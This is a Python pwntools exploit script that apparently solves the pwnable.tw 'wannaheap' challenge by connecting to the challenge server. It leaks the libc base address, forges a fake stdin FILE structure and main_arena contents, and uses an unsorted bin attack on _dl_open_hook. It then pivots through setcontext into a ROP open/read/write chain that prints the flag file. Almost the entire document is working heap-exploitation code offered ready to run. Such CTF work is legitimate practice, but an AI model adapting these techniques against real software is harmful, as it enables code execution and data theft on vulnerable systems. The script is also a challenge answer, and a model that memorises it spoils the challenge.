from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()


sh=remote('chall.pwnable.tw',10305)
# else:
# 	sh=process("./wannaheap")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	context.terminal = ['tmux', 'splitw', '-v']
	gdb.attach(sh,command)

def choice(elect):
	ru(':')
	sl(str(elect).encode())

def add(size):
	choice(1)
	ru(':')
	sl(str(size).encode())

def edit(index,content):
	choice(2)
	ru(':')
	sl(str(index).encode())
	ru(':')
	sl(content)

def show(index):
	choice(4)
	ru(':')
	sl(str(index).encode())

def delete(index):
	choice(3)
	ru(':')
	sl(str(index).encode())

def exp():
	# libc=ELF("/glibc/2.24/64/lib/libc-2.24.so")
    # libc = ELF('')
	libc=ELF("./libc-4e5dfd832191073e18a09728f68666b6465eeacd.so")
	# debug("b*0x7ffff7aa36aa\nc")
	#1.modify stdin buffer
	ru("Size :")
	# sl(str(0x6998e8)) #local
	sl(str(0x6c28e8))
	ru("Size :")
	sl(str(0x300000))
	ru("Content :")
	sl("./flag\x00")


	#2.leak libc
	ru(">")
	s("A")
	ru("key :")
	s(b"\x22")
	ru("data :")
	s("a"*8)
	ru(">")
	ru(">")
	s("A")
	ru("key :")
	s(b"\x12")
	ru("data :")
	s("a"*0x10)
	ru(">")
	ru(">")
	s("R")
	ru("key:")
	s(b"\x12")
	ru("a"*0x10)

	libc_base=u64(ru("\n").ljust(8,b"\x00"))-libc.symbols["_IO_file_jumps"]
	#libc_base=u64(ru("\n").ljust(8,b"\x00"))-97-libc.symbols["_IO_2_1_stdout_"]
	IO_stdin=libc_base+libc.symbols["_IO_2_1_stdin_"]+0x40

	io_stdfile_0_lock=libc_base+libc.symbols["_IO_stdfile_0_lock"]
	#io_stdfile_0_lock=libc_base+0x3c3770
	
	io_file_jumps=libc_base+libc.symbols["_IO_file_jumps"]
	dl_open_hook=libc_base+libc.symbols["_dl_open_hook"]
	setcontext=libc_base+libc.symbols["setcontext"]
	_main_arena=IO_stdin+0x200
	info_addr("libc_base",libc_base)

	# 3.unsortd bin attack dl_open_hook
	# 	local
	gadget=libc_base+0x00000000000676aa
	heap=libc_base-0x301000
	ret=libc_base+0x000000000001fc1c
	rdi_ret=libc_base+0x000000000001fc6a
	rsi_ret=libc_base+0x000000000001fc1b
	rdx_ret=libc_base+0x0000000000001b92
	# 	remote
	# gadget=libc_base+0x000000000006ebbb
	# heap=libc_base-0x301000
	# ret=libc_base+0x00000000000937
	# rdi_ret=libc_base+0x000000000001fd7a
	# rsi_ret=libc_base+0x000000000001fcbd
	# rdx_ret=libc_base+0x0000000000001b92
	_open=libc_base+libc.symbols["open"]
	_read=libc_base+libc.symbols["read"]
	_write=libc_base+libc.symbols["write"]

	s(p16(((IO_stdin+0x400)&0xffff)))
	sleep(5)
	info_addr("gadget",gadget)
		#3.1 stdin fifo
	fake_stdin=p64(IO_stdin+0x341)+p64(0)*6+b"\xff"*8+p64(0xa000000)+p64(io_stdfile_0_lock)+b'\xff'*8+\
			 p64(0)*5+b'\xff'*4+b'\x00'*4+p64(0)*2+p64(io_file_jumps)
		#3.2 fake chunk & ROP
	fake_chunk=p64(0)+p64(0x41)+p64(0)+p64(dl_open_hook-0x10)+\
				p64(0x20)+p64(0x20)+p64(0)*2+p64(0x40)+p64(0x621)
	ORW=p64(rdi_ret)+p64(heap+0x10)+p64(rsi_ret)+p64(4)+\
			   p64(rdx_ret)+p64(0)+p64(_open)+\
			   p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(heap+0x30)+\
			   p64(rdx_ret)+p64(0x100)+p64(_read)+\
			   p64(rdi_ret)+p64(2)+p64(rsi_ret)+p64(heap+0x30)+\
			   p64(rdx_ret)+p64(0x20)+p64(_write)
	fake_wide=(fake_chunk+ORW).ljust(0x140,b'\x00') #0x140 bytes
		#3.3 hook
	four_hook=p64(0)*2+p64(0)+p64(0)  #0x20 bytes
		#3.4 main_arena data
	main_arena=p64(0x100000000)+p64(0)*10+p64(gadget)+p64(IO_stdin+0xa0)*3+\
				p64(setcontext+53)+p64(_main_arena+104)
	for i in range(7):
		main_arena+=p64(_main_arena+120+i*0x10)*2
	main_arena+=p64(IO_stdin+0xf0)+p64(ret)
	payload=fake_stdin+fake_wide+four_hook+main_arena
		#3.5 unsorted bin attack & call dl_open_mode
	s(payload)
	#debug()
	itr()

exp()

